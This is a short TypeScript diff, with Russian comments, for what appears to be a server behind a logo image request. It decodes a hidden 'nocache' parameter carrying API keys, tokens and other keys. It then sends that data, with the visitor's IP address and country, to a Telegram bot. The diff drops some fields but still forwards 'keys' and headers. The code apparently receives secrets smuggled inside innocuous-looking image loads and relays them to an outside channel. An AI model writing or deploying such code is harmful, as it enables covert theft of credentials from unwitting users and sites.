@@ -84,12 +84,9 @@ async function decryptNocache(nocache: any) {
     const data = JSON.parse(decoded);
     
     return {
-      ref: data.ref,
-      api_key: data.api_key,
-      token: data.token,
       timestamp: data.timestamp ? new Date(data.timestamp * 1000).toISOString() : null,
       header: data.header,
-      keys: data.keys || [],
+      keys: data.keys || []
     };
   } catch (error) {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -119,7 +116,7 @@ async function getCountryByIp(ip: any) {
 }
 
 // Функция отправки в Telegram
-async function sendToTelegram(ip: any, country: any, decryptedData:any) {
+async function sendToTelegram(ip: any, country: any, decryptedData: { timestamp: string | null; header: any; keys: any; error?: undefined; } | { error: string; timestamp?: undefined; header?: undefined; keys?: undefined; } | null) {
   try {
     // Форматируем сообщение
     let message = `🌐 *Новый запрос логотипа*\n\n`;
